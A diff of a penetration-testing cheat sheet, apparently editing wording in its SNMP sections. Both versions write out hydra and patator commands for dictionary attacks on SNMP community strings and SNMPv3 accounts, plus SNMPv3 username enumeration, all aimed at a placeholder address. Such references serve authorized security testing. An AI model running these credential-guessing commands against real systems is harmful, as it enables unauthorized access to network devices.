@@ -187,16 +187,16 @@ hydra -l '<email>' -P '<passwords.txt>' 10.10.10.10 smtp
 
 ### SNMP
 ```
-hydra  -P '<snmp-community-strings.txt>' 10.10.10.10 snmp
+hydra -P '<snmp-community-strings.txt>' 10.10.10.10 snmp
 ```
 >  The command above will not work for SNMPv3 because SNMPv3 uses username and password for authentication, unlike SNMPv1 and SNMPv2 which rely on community strings.
-Refer to this command for `SNMPv3` :
-#### SNMPv3 dictionary attack
+Refer to this command if you want to use `SNMPv3` :
+#### SNMPv3
 ```
 hydra -l '<user>' -P '<passwords.txt>' -m:3:MD5 10.10.10.10 snmp
 ```
-> 1. The command above will perform a dictionary attack using the `AuthNoPriv` security level. The SNMPv3 module only support authentication (md5/sha) so far, not yet encryption. For more information, run `hydra snmp -U`
-> 2. Furthermore, note that the SNMPv3 module is still in beta state in hydra. Hence, it may not work properly. A better alternative will be `[snmpwn](https://github.com/hatlord/snmpwn)`
+> 1. The command above will perform a dictionary attack using the `AuthNoPriv` security level. Hydra SNMPv3 module doesn't support encryption. For more information, run `hydra snmp -U`
+> 2. Furthermore, note that SNMPv3 module is still in beta state in hydra. Hence, it may not work properly. A better alternative will be `[snmpwn](https://github.com/hatlord/snmpwn)`
 
 ### SSH
 ```
@@ -425,12 +425,12 @@ Here is the syntax for `SNMPv1/v2c`
 ```
 patator snmp_login host=10.10.10.10 community=FILE0 0='<passwords.txt>' -x ignore:mesg='No SNMP response received before timeout'
 ```
-> Patator can also be used to perform a SNMPv3 username enumeration and dictionary attack.
+> Patator can also be used to perform SNMPv3 username enumeration and dictionary attack.
 #### SNMPv3 username enumeration
 ```
 patator snmp_login host=10.10.10.10 version=3 user=FILE0 0=users.txt -x ignore:mesg='Unknown USM user'
 ```
-#### SNMPv3 dictionary attack (Patator)
+#### SNMPv3 dictionary attack
 ```
 patator snmp_login host=10.10.10.10 version=3 user=<user> auth_proto=md5 auth_key=FILE0 0=passwords.txt -x ignore:mesg='Wrong SNMP PDU digest' -x ignore:mesg='SNMPv3 requires passwords to be at least 8 characters long'
 ```
